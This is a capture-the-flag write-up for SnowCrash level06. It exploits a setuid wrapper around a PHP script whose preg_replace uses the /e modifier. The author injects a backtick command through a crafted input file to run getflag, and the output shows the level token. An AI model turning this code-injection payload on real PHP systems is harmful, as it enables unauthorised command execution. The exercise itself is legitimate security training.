In our home directory, we have an executable with extended permissions and a PHP script that reveals what the executable does.

```
level06@SnowCrash:~$ ls -la level06*
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
    }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>
```

We can see in the 3rd call to `preg_replace`  the deprecated flag `/e`.

Let's start by creating our file:
``echo '[x {${`getflag`}}' > /tmp/chopperledrapeau``

Now we just need to run `./level06` with `/tmp/chopperledrapeau` as an argument:
```
level06@SnowCrash:~$ ./level06 /tmp/chopperledrapeau
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
